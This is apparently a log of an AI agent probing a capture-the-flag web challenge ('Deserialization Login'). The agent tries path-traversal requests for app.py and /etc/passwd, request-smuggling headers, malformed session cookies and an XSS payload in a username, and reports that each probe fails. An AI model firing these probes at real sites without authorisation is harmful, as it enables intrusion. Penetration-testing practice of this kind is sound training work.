+        <div id="login-page" class="row">
+            <div class="col s12 z-depth-6 card-panel">
+              <form class="login" action="/login" method="post" style="width:450px;">
+                <div class="r
+hook: PostToolUse
+hook: PostToolUse Completed
+codex
+Changing the `Host` header to `127.0.0.1` yields only an empty 502 from the platform proxy, not an internal app response. Forwarded host/proto/IP and rewrite headers are ignored by Flask routing/redirect generation.
+exec
+/bin/bash -lc 'curl -i -sS --max-time 10 --path-as-is http://9bc98ac1fbf88cb6911b31bb.http-ctf2.dasctf.com/login/' in /home/stw/ctf-agent/challenges/manual_web_fafdc5730dee
+ succeeded in 0ms:
+HTTP/1.1 404 Not Found
+Content-Length: 232
+Connection: keep-alive
+Content-Type: text/html
+Date: Sat, 01 Aug 2026 12:29:06 GMT
+Keep-Alive: timeout=4
+Proxy-Connection: keep-alive
+Server: openresty
+Set-Cookie: session=13247049-1d87-422d-bda0-c802f6392d2c.zYKAKRlWUVU01xAjBxxdNLMTrqA; Expires=Sat, 01-Aug-2026 14:29:06 GMT; HttpOnly; Path=/
+
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
+<title>404 Not Found</title>
+<h1>Not Found</h1>
+<p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p>
+
+hook: PostToolUse
+exec
+/bin/bash -lc 'curl -i -sS --max-time 10 --path-as-is http://9bc98ac1fbf88cb6911b31bb.http-ctf2.dasctf.com//login' in /home/stw/ctf-agent/challenges/manual_web_fafdc5730dee
+ succeeded in 0ms:
+HTTP/1.1 308 Permanent Redirect
+Content-Length: 313
+Cache-Control: no-cache
+Connection: keep-alive
+Content-Type: text/html; charset=utf-8
+Date: Sat, 01 Aug 2026 12:29:06 GMT
+Keep-Alive: timeout=4
+Location: http://9bc98ac1fbf88cb6911b31bb.http-ctf2.dasctf.com/
+Proxy-Connection: keep-alive
+Server: openresty
+Set-Cookie: session=fc3f2d29-6547-4924-8e03-64eff9a08df5.LbH9Xh-kynRuB924j6xr6mtQQfk; Expires=Sat, 01-Aug-2026 14:29:06 GMT; HttpOnly; Path=/
+
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
+<title>Redirecting...</title>
+<h1>Redirecting...</h1>
+<p>You should be redirected automatically to target URL: <a href="http://9bc98ac1fbf88cb6911b31bb.http-ctf2.dasctf.com/">http://9bc98ac1fbf88cb6911b31bb.http-ctf2.dasctf.com/</a>.  If not click the link.
+exec
+/bin/bash -lc 'curl -i -sS --max-time 10 --path-as-is http://9bc98ac1fbf88cb6911b31bb.http-ctf2.dasctf.com/%2flogin' in /home/stw/ctf-agent/challenges/manual_web_fafdc5730dee
+hook: PostToolUse
+ succeeded in 0ms:
+HTTP/1.1 200 OK
+Content-Length: 2771
+Cache-Control: no-cache
+Connection: keep-alive
+Content-Type: text/html; charset=utf-8
+Date: Sat, 01 Aug 2026 12:29:06 GMT
+Keep-Alive: timeout=4
+Proxy-Connection: keep-alive
+Server: openresty
+Set-Cookie: session=4cf6f712-ec41-4ddd-8836-fc5e5c63f9b9.A7J5XAG4xZyeVfcprN2ejN1cCKE; Expires=Sat, 01-Aug-2026 14:29:06 GMT; HttpOnly; Path=/
+Vary: Accept-Encoding
+
+<!doctype html>
+<html lang="zh">
+<head>
+        <meta charset="UTF-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <title>Deserialization Login</title>
+        <link rel="stylesheet" type="text/css" href="/static/css/default.css">
+        <link rel="stylesheet" href="/static/css/materialize.min.css">
+        <style type="text/css">
+        html,
+        body {
+            height: 100%;
+        }
+        html {
+            display: table;
+            margin: auto;
+        }
+        body {
+            display: table-cell;
+            vertical-align: middle;
+        }
+
+        .margin {
+          margin: 0 !important;
+        }
+        </style>
+</head>
+<body class="black">
+        <div id="login-page" class="row">
+            <div class="col s12 z-depth-6 card-panel">
+              <form class="login" action="/login" method="post" style="width:450px;">
+                <div class="row">
+                  <div class="input-field col s12 center">
+                    <p class="center login-form-text">--------SWPU-CTF WEB LOGIN--------</p>
+                  </div>
+                </div>
+                <div class="row margin">
+                  <div class="input-field col s12">
+                    <i class="mdi-social-person-outline prefix"></i>
+                    <input name="username" type="text" placeholder="Username">
+                  </div>
+                </div>
+                <div class="row margin">
+                  <div class="input-field col s12">
+                    <i class="mdi-action-lock-outline prefix"></i>
+                    <input id="password" name= "password" type="password" placeholder="Password">
+                  </div>
+                </div>
+                <div class="row">
+                  <div class="input-field col s12 m12 l12  login-text">
+                      <input type="checkbox" id="remember-me" />
+                      <label for="remember-me">Remember me</label>
+                  </div>
+                </div>
+                <div class="row">
+                  <div class="input-field col s12">
+                                <input type=submit value=submit class="btn waves-effect waves-light col s12">
+                  </div>
+                </div>
+                <div class="row">
+                  <div class="input-field col s6 m6 l6">
+                    <p class="margin medium-small"><a href="/register">Register now!</a></p>
+                  </div>
+
+              </form>
+            </div>
+          </div>
+          </div>
+
+        <!--materialize js-->
+        <script src="/static/js/materialize.min.js"></script>
+</body>
+</html>
+hook: PostToolUse
+exec
+/bin/bash -lc 'curl -i -sS --max-time 10 --path-as-is http://9bc98ac1fbf88cb6911b31bb.http-ctf2.dasctf.com/static/css/default.css' in /home/stw/ctf-agent/challenges/manual_web_fafdc5730dee
+ succeeded in 35ms:
+HTTP/1.1 200 OK
+Content-Length: 1301
+Accept-Ranges: bytes
+Cache-Control: max-age=60
+Connection: keep-alive
+Content-Type: text/css
+Date: Sat, 01 Aug 2026 12:29:06 GMT
+Etag: "5d56c185-515"
+Expires: Sat, 01 Aug 2026 12:30:06 GMT
+Keep-Alive: timeout=4
+Last-Modified: Fri, 16 Aug 2019 14:45:25 GMT
+Proxy-Connection: keep-alive
+Server: openresty
+Vary: Accept-Encoding
+X-Cache: HIT
+
+body{
+	font-family: "Helvetica Neue",Helvetica,Arial,sans-serif;
+	background-image: url("../background.jpg");
+	color: #ddd;
+}
+div.back{
+	margin-left: auto;
+	margin-right: auto;
+	border-radius: 20px;
+}
+button{
+	min-width:150px;
+	margin-left:30px;
+}
+div.button a{
+	min-width: 130px;
+}
+ul li{
+	margin-top: 10px;
+	border-radius: 5px;
+}
+ul.buy{
+	margin-top: 150px; 
+}
+img.avatar{
+	max-width: 50px;
+	max-height: 50px;
+	border-radius: 50px;
+}
+div.warn{
+	margin-top: 150px;
+	margin-bottom: 20px;
+	border-radius: 5px;
+	background-color: #444;
+}
+div.warn h3{
+	margin-top: 5px;
+}
+div.warn p a{
+	margin-left: 20px; 
+}
+li a{
+	margin-left: 20px; 
+}
+h2{
+	color: #ddd;
+}
+div.window{
+	max-height: 300px;
+	max-width: 600px;
+	margin-right: auto;
+	margin-left: auto;
+}
+.list-group-item{
+	background-color: #444;
+}
+div.main{
+	min-height: 200px;
+}
+div.list-group{
+	background-color: #444;
+}
+div.list{
+	min-width: 60%;
+}
+div.cimg{
+	min-width: 40%;
+}
+div.cimg img{
+	margin: auto;
+	max-height: 150px;
+	text-align: center;
+	display: block;
+}
+div.cimg h4{
+	text-align: center;
+}
+div.edit{
+	width: 450px;
+	margin-top: 10px;
+	margin: auto;
+}
+div.edit input{
+	max-width: 400px;
+	margin: auto;
+}
+div.edit textarea{
+	max-width: 400px;
+	margin: auto;
+}
+div.edit h4{
+	margin-left: 10px; 
+}
+div.bimg{
+	float: left;
+	margin-left: 35px;
+}
+hook: PostToolUse
+hook: PostToolUse Completed
+hook: PostToolUse Completed
+hook: PostToolUse Completed
+hook: PostToolUse Completed
+exec
+/bin/bash -lc 'curl -i -sS --max-time 10 --path-as-is http://9bc98ac1fbf88cb6911b31bb.http-ctf2.dasctf.com/static/../app.py' in /home/stw/ctf-agent/challenges/manual_web_fafdc5730dee
+ succeeded in 0ms:
+HTTP/1.1 404 Not Found
+Content-Length: 232
+Connection: keep-alive
+Content-Type: text/html
+Date: Sat, 01 Aug 2026 12:29:07 GMT
+Keep-Alive: timeout=4
+Proxy-Connection: keep-alive
+Server: openresty
+Set-Cookie: session=ea07e625-651c-40af-830a-eae4e765f586.OavtwbGJG6kb_241ZeqOcK0Wp24; Expires=Sat, 01-Aug-2026 14:29:07 GMT; HttpOnly; Path=/
+
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
+<title>404 Not Found</title>
+<h1>Not Found</h1>
+<p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p>
+
+exec
+/bin/bash -lc 'curl -i -sS --max-time 10 --path-as-is http://9bc98ac1fbf88cb6911b31bb.http-ctf2.dasctf.com/static/%2e%2e/app.py' in /home/stw/ctf-agent/challenges/manual_web_fafdc5730dee
+ succeeded in 0ms:
+HTTP/1.1 404 Not Found
+Content-Length: 232
+Connection: keep-alive
+Content-Type: text/html
+Date: Sat, 01 Aug 2026 12:29:07 GMT
+Keep-Alive: timeout=4
+Proxy-Connection: keep-alive
+Server: openresty
+Set-Cookie: session=3d3eab13-ba47-4c4c-9c3c-1b0aa172362f.2uIclcRWCxpEvr3cj6Ca6WSnwS4; Expires=Sat, 01-Aug-2026 14:29:07 GMT; HttpOnly; Path=/
+
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
+<title>404 Not Found</title>
+<h1>Not Found</h1>
+<p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p>
+
+hook: PostToolUse
+hook: PostToolUse
+hook: PostToolUse Completed
+hook: PostToolUse Completed
+codex
+Path normalization gives no file leak: static traversal variants return Flask 404, and static assets are served with short cache headers. There is a mild routing oddity (`/%2flogin` reaches `/login`), but it does not expose a write or leak by itself.
+exec
+/bin/bash -lc "curl -i -sS --max-time 10 --http1.1 -H 'Transfer-Encoding: chunked' -d 'username=chunk1&password=p' http://9bc98ac1fbf88cb6911b31bb.http-ctf2.dasctf.com/register" in /home/stw/ctf-agent/challenges/manual_web_fafdc5730dee
+exec
+/bin/bash -lc "curl -i -sS --max-time 10 --http1.1 -H 'Transfer-Encoding: chunked' -H 'Content-Length: 4' -d 'username=chunkcl&password=p' http://9bc98ac1fbf88cb6911b31bb.http-ctf2.dasctf.com/register" in /home/stw/ctf-agent/challenges/manual_web_fafdc5730dee
+ succeeded in 0ms:
+HTTP/1.1 302 Found
+Content-Length: 209
+Cache-Control: no-cache
+Connection: keep-alive
+Content-Type: text/html; charset=utf-8
+Date: Sat, 01 Aug 2026 12:29:34 GMT
+Keep-Alive: timeout=4
+Location: http://9bc98ac1fbf88cb6911b31bb.http-ctf2.dasctf.com/
+Proxy-Connection: keep-alive
+Server: openresty
+Set-Cookie: session=12a4b51a-0feb-48d5-9572-9b2992e6ba79.GI8E2cWto5y4RjtVIzHr7Cb2wFE; Expires=Sat, 01-Aug-2026 14:29:34 GMT; HttpOnly; Path=/
+
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
+<title>Redirecting...</title>
+<h1>Redirecting...</h1>
+<p>You should be redirected automatically to target URL: <a href="/">/</a>.  If not click the link.
+ succeeded in 0ms:
+HTTP/1.1 302 Found
+Content-Length: 209
+Cache-Control: no-cache
+Connection: keep-alive
+Content-Type: text/html; charset=utf-8
+Date: Sat, 01 Aug 2026 12:29:34 GMT
+Keep-Alive: timeout=4
+Location: http://9bc98ac1fbf88cb6911b31bb.http-ctf2.dasctf.com/
+Proxy-Connection: keep-alive
+Server: openresty
+Set-Cookie: session=934641b8-5732-4a62-92af-02813a53013d.QLTpWd_GZEZkadUCHVyYa6c41sA; Expires=Sat, 01-Aug-2026 14:29:34 GMT; HttpOnly; Path=/
+
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
+<title>Redirecting...</title>
+<h1>Redirecting...</h1>
+<p>You should be redirected automatically to target URL: <a href="/">/</a>.  If not click the link.
+exec
+/bin/bash -lc "curl -i -sS --max-time 10 --http1.0 -d 'username=http10&password=p' http://9bc98ac1fbf88cb6911b31bb.http-ctf2.dasctf.com/register" in /home/stw/ctf-agent/challenges/manual_web_fafdc5730dee
+hook: PostToolUse
+hook: PostToolUse
+ succeeded in 0ms:
+HTTP/1.1 302 Found
+Content-Length: 209
+Cache-Control: no-cache
+Connection: keep-alive
+Content-Type: text/html; charset=utf-8
+Date: Sat, 01 Aug 2026 12:29:34 GMT
+Keep-Alive: timeout=4
+Location: http://9bc98ac1fbf88cb6911b31bb.http-ctf2.dasctf.com/
+Proxy-Connection: keep-alive
+Server: openresty
+Set-Cookie: session=cbadaa36-02e2-41f0-a306-ebc935a395ab.FdfFS7P0fSjPRzaTJGCJ6RTnkFs; Expires=Sat, 01-Aug-2026 14:29:34 GMT; HttpOnly; Path=/
+
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
+<title>Redirecting...</title>
+<h1>Redirecting...</h1>
+<p>You should be redirected automatically to target URL: <a href="/">/</a>.  If not click the link.
+hook: PostToolUse
+exec
+/bin/bash -lc "curl -i -sS --max-time 10 -H 'Expect: 100-continue' -d 'username=expect1&password=p' http://9bc98ac1fbf88cb6911b31bb.http-ctf2.dasctf.com/register" in /home/stw/ctf-agent/challenges/manual_web_fafdc5730dee
+hook: PostToolUse Completed
+hook: PostToolUse Completed
+hook: PostToolUse Completed
+ succeeded in 919ms:
+HTTP/1.1 302 Found
+Content-Length: 209
+Cache-Control: no-cache
+Connection: keep-alive
+Content-Type: text/html; charset=utf-8
+Date: Sat, 01 Aug 2026 12:29:35 GMT
+Keep-Alive: timeout=4
+Location: http://9bc98ac1fbf88cb6911b31bb.http-ctf2.dasctf.com/
+Proxy-Connection: keep-alive
+Server: openresty
+Set-Cookie: session=8f778850-4c66-43fc-9731-22f75b726ec0.jERTMaZQSihNFpYLsgf_teCoJho; Expires=Sat, 01-Aug-2026 14:29:35 GMT; HttpOnly; Path=/
+
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
+<title>Redirecting...</title>
+<h1>Redirecting...</h1>
+<p>You should be redirected automatically to target URL: <a href="/">/</a>.  If not click the link.
+hook: PostToolUse
+hook: PostToolUse Completed
+codex
+Chunked bodies, CL+TE, HTTP/1.0, and `Expect: 100-continue` all behave like normal form POSTs. Hermes also confirmed the Redis-auth and session-key-collision routes are dead, so I’m keeping this branch to HTTP leak/write sinks only.
+exec
+/bin/bash -lc "python3 - <<'PY'
+import requests, urllib.parse
+base='http://9bc98ac1fbf88cb6911b31bb.http-ctf2.dasctf.com'
+vals=[
+ ('empty',''),
+ ('dot','.'),
+ ('manydots','a.b.c.d'),
+ ('uuid_only','11111111-1111-1111-1111-111111111111'),
+ ('uuid_dot_empty','11111111-1111-1111-1111-111111111111.'),
+ ('bad_b64','11111111-1111-1111-1111-111111111111."'!!!!'"'),
+ ('quoted_bad','\"abc.def\"'),
+ ('comma','abc.def, other=x'),
+ ('slash','../../../../etc/passwd.sig'),
+ ('percentdot','abc%2edef'),
+ ('unicode_pct','%E2%98%83.sig'),
+ ('long','A'*4096+'.B'),
+]
+for label,val in vals:
+    r=requests.get(base+'/', headers={'Cookie':'session='+val}, timeout=10, allow_redirects=False)
+    body=' '.join(r.text.split())[:180]
+    print('\\n==',label, 'status', r.status_code, 'len', len(r.content), 'set', r.headers.get('Set-Cookie'))
+    print(body)
+PY" in /home/stw/ctf-agent/challenges/manual_web_fafdc5730dee
+ succeeded in 2160ms:
+
+== empty status 200 len 2771 set session=f5188eda-3b98-4d34-b6e9-a0d6ed8277f5.MdwNGBzEJfgU0C4rmQEugwKcTlc; Expires=Sat, 01-Aug-2026 14:29:47 GMT; HttpOnly; Path=/
+<!doctype html> <html lang="zh"> <head> <meta charset="UTF-8"> <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no"> <meta name=
+
+== dot status 200 len 2771 set session=7a286f1f-9d0e-4587-bed0-cfd8b0a71679.7BWoNIX7-FkoydzDEC2iy0VEgug; Expires=Sat, 01-Aug-2026 14:29:47 GMT; HttpOnly; Path=/
+<!doctype html> <html lang="zh"> <head> <meta charset="UTF-8"> <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no"> <meta name=
+
+== manydots status 200 len 2771 set session=c175a114-0731-42db-9cbf-530f8b29ded3.Sn3PVSSiXEY9BB4k7WdoGR4lDiY; Expires=Sat, 01-Aug-2026 14:29:47 GMT; HttpOnly; Path=/
+<!doctype html> <html lang="zh"> <head> <meta charset="UTF-8"> <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no"> <meta name=
+
+== uuid_only status 200 len 2771 set session=fd97d46d-41ef-490b-89d7-66031b6c2654.f2OEj6MXISWdyfSE_se3y3paaRM; Expires=Sat, 01-Aug-2026 14:29:48 GMT; HttpOnly; Path=/
+<!doctype html> <html lang="zh"> <head> <meta charset="UTF-8"> <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no"> <meta name=
+
+== uuid_dot_empty status 200 len 2771 set session=0b40d2a0-8b83-49cb-a038-919369eb202b.9JEFPi43DuwDYQ9VmGqEAgtXRW8; Expires=Sat, 01-Aug-2026 14:29:48 GMT; HttpOnly; Path=/
+<!doctype html> <html lang="zh"> <head> <meta charset="UTF-8"> <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no"> <meta name=
+
+== bad_b64 status 200 len 2771 set session=6d045a1f-d9a1-4213-8ebe-61f4d3dd4706.AQSOK2_DF14wWMdRZ2kzT6CLmn4; Expires=Sat, 01-Aug-2026 14:29:48 GMT; HttpOnly; Path=/
+<!doctype html> <html lang="zh"> <head> <meta charset="UTF-8"> <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no"> <meta name=
+
+== quoted_bad status 200 len 2771 set session=c389e4a9-1951-4934-b503-794b277693ac.eG8iF9hTeJz01MN8tFgG106a0Mw; Expires=Sat, 01-Aug-2026 14:29:48 GMT; HttpOnly; Path=/
+<!doctype html> <html lang="zh"> <head> <meta charset="UTF-8"> <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no"> <meta name=
+
+== comma status 200 len 2771 set session=bb5de7b9-e297-45cd-9802-e0ccea0cc16f.Mi_XMZXvMe_3xWmFIJfc1_63Zkk; Expires=Sat, 01-Aug-2026 14:29:48 GMT; HttpOnly; Path=/
+<!doctype html> <html lang="zh"> <head> <meta charset="UTF-8"> <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no"> <meta name=
+
+== slash status 200 len 2771 set session=3a5321da-be21-4809-95e8-a04d9347c9a6.PFl5-HBsg2r76nLqi4WgYalD_Yw; Expires=Sat, 01-Aug-2026 14:29:49 GMT; HttpOnly; Path=/
+<!doctype html> <html lang="zh"> <head> <meta charset="UTF-8"> <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no"> <meta name=
+
+== percentdot status 200 len 2771 set session=0dd23bf6-d5ca-4ab3-ab1c-ebfc47e5b59b.igIVFs6UTN9j7NX37VPT9fZIgso; Expires=Sat, 01-Aug-2026 14:29:49 GMT; HttpOnly; Path=/
+<!doctype html> <html lang="zh"> <head> <meta charset="UTF-8"> <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no"> <meta name=
+
+== unicode_pct status 200 len 2771 set session=4958de2e-6213-495e-a185-b8fa20181054.yfz0GdaRRVXKR-XYtISK_iQzE-8; Expires=Sat, 01-Aug-2026 14:29:49 GMT; HttpOnly; Path=/
+<!doctype html> <html lang="zh"> <head> <meta charset="UTF-8"> <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no"> <meta name=
+
+== long status 200 len 2771 set session=b5dfb3b0-cc4d-4265-a36b-63a03cbb002a.eWz-xdHVW05_xdrupPrmPCCrkUM; Expires=Sat, 01-Aug-2026 14:29:49 GMT; HttpOnly; Path=/
+<!doctype html> <html lang="zh"> <head> <meta charset="UTF-8"> <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no"> <meta name=
+
+hook: PostToolUse
+hook: PostToolUse Completed
+codex
+Malformed session cookies all fail closed: the app returns a fresh signed UUID and no stack trace, even for extra dots, bad base64-ish signatures, path traversal-looking values, and long cookies.
+exec
+/bin/bash -lc "python3 - <<'PY'
+import requests, time, html
+base='http://9bc98ac1fbf88cb6911b31bb.http-ctf2.dasctf.com'
+payload='<img src=x onerror=alert(1)>\"&\\''
+s=requests.Session()
+s.post(base+'/register', data={'username':payload,'password':'p'}, allow_redirects=False, timeout=10)
+s.post(base+'/login', data={'username':payload,'password':'p'}, allow_redirects=False, timeout=10)
+r=s.get(base+'/', timeout=10)
+idx=r.text.find('Welcome')
+print('status', r.status_code)
+print(r.text[idx-80:idx+220])
+print('raw_payload_present', payload in r.text)
+print('escaped_payload_present', html.escape(payload) in r.text)
+PY" in /home/stw/ctf-agent/challenges/manual_web_fafdc5730dee
+ succeeded in 581ms:
+status 200
+dy>
+	<p class="main" style="font-family:arial;color:black;font-size:100px;"><em>Welcome,&lt;img src=x onerror=alert(1)&gt;&#34;&amp;&#39;</em></p>
+</body>
+<!--没错就是这么简洁~Red*s-->
+</html>
+raw_payload_present False
+escaped_payload_present False
+
+hook: PostToolUse
+hook: PostToolUse Completed
+codex
+Username reflection is HTML-escaped, so there is no cookie-setting/XSS side door from the reflected welcome page. I’m doing one more pass over static/proxy source-leak edge paths before closing the branch.
+exec
+/bin/bash -lc 'curl -i -sS --max-time 10 --path-as-is http://9bc98ac1fbf88cb6911b31bb.http-ctf2.dasctf.com/static../app.py' in /home/stw/ctf-agent/challenges/manual_web_fafdc5730dee
+exec
+/bin/bash -lc 'curl -i -sS --max-time 10 --path-as-is http://9bc98ac1fbf88cb6911b31bb.http-ctf2.dasctf.com/static/%2e%2e%2fapp.py' in /home/stw/ctf-agent/challenges/manual_web_fafdc5730dee
+ succeeded in 0ms:
+HTTP/1.1 404 Not Found
+Content-Length: 232
+Connection: keep-alive
+Content-Type: text/html
+Date: Sat, 01 Aug 2026 12:30:19 GMT
+Keep-Alive: timeout=4
+Proxy-Connection: keep-alive
+Server: openresty
+Set-Cookie: session=32a60638-881f-4d59-af08-9f956a833a3f._ESngFVh-Ileb_ZvAlsmg9nWMK0; Expires=Sat, 01-Aug-2026 14:30:19 GMT; HttpOnly; Path=/
+
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
+<title>404 Not Found</title>
+<h1>Not Found</h1>
+<p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p>
+
+hook: PostToolUse
+exec
+/bin/bash -lc 'curl -i -sS --max-time 10 --path-as-is http://9bc98ac1fbf88cb6911b31bb.http-ctf2.dasctf.com/static..%2fapp.py' in /home/stw/ctf-agent/challenges/manual_web_fafdc5730dee
+exec
+/bin/bash -lc 'curl -i -sS --max-time 10 --path-as-is http://9bc98ac1fbf88cb6911b31bb.http-ctf2.dasctf.com/static/css/default.css/..%2f..%2fapp.py' in /home/stw/ctf-agent/challenges/manual_web_fafdc5730dee
+exec
+/bin/bash -lc 'curl -i -sS --max-time 10 --path-as-is http://9bc98ac1fbf88cb6911b31bb.http-ctf2.dasctf.com/static;foo=bar/css/default.css' in /home/stw/ctf-agent/challenges/manual_web_fafdc5730dee
+hook: PostToolUse Completed
+ succeeded in 214ms:
+HTTP/1.1 404 Not Found
+Content-Length: 232
+Connection: keep-alive
+Content-Type: text/html
+Date: Sat, 01 Aug 2026 12:30:19 GMT
+Keep-Alive: timeout=4
+Proxy-Connection: keep-alive
+Server: openresty
+Set-Cookie: session=2a857505-25fd-4cd9-816a-613a3b4653c0.cwpm9aqVk1_9yjHLkvb9HKUljcU; Expires=Sat, 01-Aug-2026 14:30:19 GMT; HttpOnly; Path=/
+
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
+<title>404 Not Found</title>
+<h1>Not Found</h1>
+<p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p>
+
+hook: PostToolUse
+ succeeded in 207ms:
+HTTP/1.1 404 Not Found
+Content-Length: 232
+Connection: keep-alive
+Content-Type: text/html
+Date: Sat, 01 Aug 2026 12:30:19 GMT
+Keep-Alive: timeout=4
+Proxy-Connection: keep-alive
+Server: openresty
+Set-Cookie: session=7368444b-786e-4c4c-b189-d9436e052a21.63mtCuMk6XDgEr4ND856yNIZ4UA; Expires=Sat, 01-Aug-2026 14:30:19 GMT; HttpOnly; Path=/
+
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
+<title>404 Not Found</title>
+<h1>Not Found</h1>
+<p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p>
+
+hook: PostToolUse
+ succeeded in 208ms:
+HTTP/1.1 404 Not Found
+Content-Length: 232
+Connection: keep-alive
+Content-Type: text/html
+Date: Sat, 01 Aug 2026 12:30:19 GMT
+Keep-Alive: timeout=4
+Proxy-Connection: keep-alive
+Server: openresty
+Set-Cookie: session=f7cd4e09-ab91-4b3e-a43d-f52542c3aebb.MnuzxVy-s5rwrTqW_ububaFixE4; Expires=Sat, 01-Aug-2026 14:30:19 GMT; HttpOnly; Path=/
+
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
+<title>404 Not Found</title>
+<h1>Not Found</h1>
+<p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p>
+
+hook: PostToolUse
+hook: PostToolUse Completed
+hook: PostToolUse Completed
+hook: PostToolUse Completed
+exec
+/bin/bash -lc 'curl -i -sS --max-time 10 --path-as-is http://9bc98ac1fbf88cb6911b31bb.http-ctf2.dasctf.com/static/css/default.css%00.py' in /home/stw/ctf-agent/challenges/manual_web_fafdc5730dee
+ succeeded in 0ms:
+HTTP/1.1 400 Bad Request
+Content-Length: 154
+Connection: keep-alive
+Content-Type: text/html
+Date: Sat, 01 Aug 2026 12:30:19 GMT
+Keep-Alive: timeout=4
+Proxy-Connection: keep-alive
+Server: openresty
+
+<html>
+<head><title>400 Bad Request</title></head>
+<body>
+<center><h1>400 Bad Request</h1></center>
+<hr><center>openresty</center>
+</body>
+</html>
+
+hook: PostToolUse
+hook: PostToolUse Completed
+ succeeded in 986ms:
+HTTP/1.1 404 Not Found
+Content-Length: 232
+Connection: keep-alive
+Content-Type: text/html
+Date: Sat, 01 Aug 2026 12:30:20 GMT
+Keep-Alive: timeout=4
+Proxy-Connection: keep-alive
+Server: openresty
+Set-Cookie: session=df3e1123-6322-48fb-b477-d3610d50b0eb.cpd3qZLRlGhKlTarypCBsKnlQQk; Expires=Sat, 01-Aug-2026 14:30:20 GMT; HttpOnly; Path=/
+
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
+<title>404 Not Found</title>
+<h1>Not Found</h1>
+<p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p>
+
+hook: PostToolUse
+hook: PostToolUse Completed
+codex
+Static off-by-slash and encoded traversal variants also fail closed with 404 or openresty 400 for `%00`; no source disclosure. I’m checking error negotiation and cache/proxy headers as a final sanity pass.
+exec
+/bin/bash -lc "curl -i -sS --max-time 10 -H 'Accept: application/json' http://9bc98ac1fbf88cb6911b31bb.http-ctf2.dasctf.com/no-such-route" in /home/stw/ctf-agent/challenges/manual_web_fafdc5730dee
+exec
+/bin/bash -lc "curl -i -sS --max-time 10 -H 'Accept: application/json' -X POST -d '' http://9bc98ac1fbf88cb6911b31bb.http-ctf2.dasctf.com/register" in /home/stw/ctf-agent/challenges/manual_web_fafdc5730dee
+exec
+/bin/bash -lc "curl -i -sS --max-time 10 -H 'Accept-Encoding: br' http://9bc98ac1fbf88cb6911b31bb.http-ctf2.dasctf.com/" in /home/stw/ctf-agent/challenges/manual_web_fafdc5730dee
+exec
+/bin/bash -lc "curl -i -sS --max-time 10 -H 'Cache-Control: max-age=0' -H 'Pragma: no-cache' http://9bc98ac1fbf88cb6911b31bb.http-ctf2.dasctf.com/static/css/default.css?cache_probe=branch003" in /home/stw/ctf-agent/challenges/manual_web_fafdc5730dee
+ succeeded in 15ms:
+HTTP/1.1 400 Bad Request
+Content-Length: 192
+Connection: keep-alive
+Content-Type: text/html
+Date: Sat, 01 Aug 2026 12:30:36 GMT
+Keep-Alive: timeout=4
+Proxy-Connection: keep-alive
+Server: openresty
+Set-Cookie: session=f9332426-2db0-4897-8106-f07b1ac5b8c7.hHS3f9kIYHst7nmv2MQ88np1aA0; Expires=Sat, 01-Aug-2026 14:30:36 GMT; HttpOnly; Path=/
+
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
+<title>400 Bad Request</title>
+<h1>Bad Request</h1>
+<p>The browser (or proxy) sent a request that this server could not understand.</p>
+
+hook: PostToolUse
+ succeeded in 12ms:
+HTTP/1.1 200 OK
+Content-Length: 2771
+Cache-Control: no-cache
+Connection: keep-alive
+Content-Type: text/html; charset=utf-8
+Date: Sat, 01 Aug 2026 12:30:36 GMT
+Keep-Alive: timeout=4
+Proxy-Connection: keep-alive
+Server: openresty
+Set-Cookie: session=31a055f7-cd56-4c63-919e-3e66ee541a9f.G9ncr-lTSZ8u6VOZZ4dw6my_-MM; Expires=Sat, 01-Aug-2026 14:30:36 GMT; HttpOnly; Path=/
+Vary: Accept-Encoding
+
+<!doctype html>
+<html lang="zh">
+<head>
+        <meta charset="UTF-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <title>Deserialization Login</title>
